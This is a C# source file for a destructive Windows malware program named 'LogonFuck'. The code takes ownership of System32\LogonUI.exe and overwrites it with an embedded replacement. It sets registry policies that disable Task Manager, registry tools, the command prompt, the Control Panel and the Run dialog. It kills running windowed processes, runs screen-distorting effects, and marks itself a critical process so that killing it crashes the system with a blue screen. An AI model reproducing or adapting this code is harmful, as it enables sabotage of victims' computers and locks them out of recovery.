using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Threading;
using System.Windows.Forms;
using System.Media;
using LogonFuck.Properties;
using System.Drawing;
using System.Runtime.InteropServices;

namespace LogonFuck
{
    static class Program
    {

        public static string logonuiPath = Environment.GetFolderPath(Environment.SpecialFolder.Windows) + @"\System32\LogonUI.exe";
        public static string msgboxPath = Environment.GetFolderPath(Environment.SpecialFolder.Windows) + @"\System32\MessageBox.exe";
        private static readonly int delay = 15000;
        public static RandomDrawer randomDrawer = new RandomDrawer(400, CopyPixelOperation.SourceCopy);
        public static ShakeDrawer shakeDrawer = new ShakeDrawer(40, 10, true);
        public static CorruptionDrawer corruptionDrawer = new CorruptionDrawer(0);
        public static InverseDrawer inverseDrawer = new InverseDrawer(400, 50, CopyPixelOperation.DestinationInvert);
        public static MeltDrawer meltDrawer = new MeltDrawer(5);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CloseHandle(IntPtr hHandle);

        [Flags]
        public enum ProcessAccessFlag : uint
        {
            All = 0x001F0FFF,
            Terminate = 0x00000001,
            CreateThread = 0x00000002,
            VirtualMemoryOperation = 0x00000008,
            VirtualMemoryRead = 0x00000010,
            VirtualMemoryWrite = 0x00000020,
            DuplicateHandle = 0x00000040,
            CreateProcess = 0x000000080,
            SetQuota = 0x00000100,
            SetInformation = 0x00000200,
            QueryInformation = 0x00000400,
            QueryLimitedInformation = 0x00001000,
            Synchronize = 0x00100000
        }

        [DllImport("kernel32.dll")]
        private static extern IntPtr OpenProcess(ProcessAccessFlag processAccess, bool bInheritHandle, int processId);


        [DllImport("ntdll.dll")]
        private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

        /// <summary>
        /// Punto di ingresso principale dell'applicazione.
        /// </summary>
        [STAThread]
        static void Main()
        {
            if (IsWindows7())
            {
                Application.EnableVisualStyles();
                Application.SetCompatibleTextRenderingDefault(false);
                Application.Run(new MainForm());
            }
            else
            {
                if (MessageBox.Show("LogonFuck works well only on windows 7.\nDo you want to continue anyway?", "LogonFuck", MessageBoxButtons.YesNo, MessageBoxIcon.Warning) == DialogResult.Yes)
                {
                    Application.EnableVisualStyles();
                    Application.SetCompatibleTextRenderingDefault(false);
                    Application.Run(new MainForm());
                }
            }
        }

        public static bool IsWindows7()
        {
            try
            {
                RegistryKey ntCurrentVersion = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion");
                string productName = (string)ntCurrentVersion.GetValue("ProductName");
                ntCurrentVersion.Dispose();
                return productName.StartsWith("Windows 7", StringComparison.OrdinalIgnoreCase);
            } catch
            {
                return false;
            }
        }

        public static void StartDestruction()
        {
            Process.EnterDebugMode();
            MakeCritical();
            ReplaceLogonUI();
            DisableStuff();
            TerminateStuff();

            SoundPlayer soundPlayer;

            // horizontal melt
            meltDrawer.Start();
            soundPlayer = new SoundPlayer(Resources.crazysound1);
            soundPlayer.PlayLooping();
            Process.Start("https://kaspersky.com");

            Thread.Sleep(delay);

            // shake
            meltDrawer.Stop();
            shakeDrawer.Start();
            soundPlayer.Stop();
            soundPlayer = new SoundPlayer(Resources.crazysound2);
            soundPlayer.Play();
            Process.Start("https://www.norton.com");

            Thread.Sleep(delay);

            // inverse
            shakeDrawer.Stop();
            inverseDrawer.Start();
            soundPlayer.Stop();
            soundPlayer = new SoundPlayer(Resources.crazysound3);
            soundPlayer.Play();
            Process.Start("https://www.avg.com");

            Thread.Sleep(delay);

            // expansion
            inverseDrawer.Stop();
            corruptionDrawer.Start();
            soundPlayer.Stop();
            soundPlayer = new SoundPlayer(Resources.crazysound4);
            soundPlayer.Play();
            Process.Start("https://www.malwarebytes.com");

            Thread.Sleep(delay);

            // random
            corruptionDrawer.Stop();
            randomDrawer.Start();
            soundPlayer.Stop();
            soundPlayer = new SoundPlayer(Resources.crazysound5);
            soundPlayer.Play();
            Process.Start("https://www.avira.com");

            Thread.Sleep(delay);

            // all
            inverseDrawer.delay = 200;
            inverseDrawer.strenght = 100;
            inverseDrawer.Start();
            randomDrawer.delay = 250;
            randomDrawer.dwRop = CopyPixelOperation.SourceAnd;
            corruptionDrawer.Start();
            meltDrawer.delay = 3;
            meltDrawer.Start();
            shakeDrawer.delay = 25;
            shakeDrawer.Start();
            soundPlayer.Stop();
            soundPlayer = new SoundPlayer(Resources.crazysound6);
            soundPlayer.Play();
            Process.Start("https://www.mcafee.com");

            Thread.Sleep(delay);

            // blackness
            randomDrawer.delay = 150;
            shakeDrawer.delay = 10;
            shakeDrawer.strenght = 30;
            inverseDrawer.delay = 20;
            inverseDrawer.dwRop = CopyPixelOperation.SourceInvert;
            meltDrawer.delay = 1;
            soundPlayer.Stop();
            soundPlayer = new SoundPlayer(Resources.crazysound7);
            soundPlayer.Play();
            Process.Start("https://www.bitdefender.com");

            Thread.Sleep(delay);

            // BSOD :(
            MakeCritical();
            Process.GetCurrentProcess().Kill();
        }

        private static void DisableStuff()
        {
            try
            {
                RegistryKey editKey = Registry.CurrentUser.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System");
                editKey.SetValue("DisableTaskmgr", 1, RegistryValueKind.DWord);
                editKey.SetValue("DisableRegistryTools", 1, RegistryValueKind.DWord);
                editKey.Close();
                editKey = Registry.CurrentUser.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows\System");
                editKey.SetValue("DisableCmd", 1, RegistryValueKind.DWord);
                editKey.Close();
                editKey = Registry.CurrentUser.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer");
                editKey.SetValue("NoControlPanel", 1, RegistryValueKind.DWord);
                editKey.SetValue("NoRun", 1, RegistryValueKind.DWord);
                editKey.SetValue("NoWinKeys", 1, RegistryValueKind.DWord);
                editKey.Close();
            }
            catch { }
        }

        private static void TerminateStuff()
        {
            int currentPid = Process.GetCurrentProcess().Id;
            foreach (Process proc in Process.GetProcesses())
            {
                if (proc.MainWindowHandle != IntPtr.Zero && proc.ProcessName != "explorer" && proc.Id != currentPid)
                {
                    try
                    {
                        IntPtr handle = OpenProcess(ProcessAccessFlag.All, false, proc.Id);
                        int isCritical = 0;  // we want the proc to NOT be a Critical Process
                        int BreakOnTermination = 0x1D;  // value for BreakOnTermination (flag)
                        NtSetInformationProcess(handle, BreakOnTermination, ref isCritical, sizeof(int));
                        CloseHandle(handle);
                        proc.Kill();
                    }
                    catch
                    {

                    }
                }
            }
        }

        private static void MakeCritical()
        {
            int isCritical = 1;
            int BreakOnTermination = 0x1D;  // value for BreakOnTermination (flag)
            NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));
        }

        public static void ReplaceLogonUI()
        {
            RegistryKey editKey = Registry.CurrentUser.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows\System");
            editKey.SetValue("DisableCmd", 0, RegistryValueKind.DWord);
            editKey.Close();
            ProcessStartInfo psi = new ProcessStartInfo();
            psi.FileName = "takeown.exe";
            psi.Arguments = "/f " + logonuiPath;
            Process.Start(psi).WaitForExit();
            FileSecurity logonuiSec = File.GetAccessControl(logonuiPath);
            logonuiSec.AddAccessRule(new FileSystemAccessRule(WindowsIdentity.GetCurrent().User, FileSystemRights.FullControl, AccessControlType.Allow));
            File.SetAccessControl(logonuiPath, logonuiSec);
            File.WriteAllBytes(logonuiPath, Resources.firelogonui);
        }
    }
}
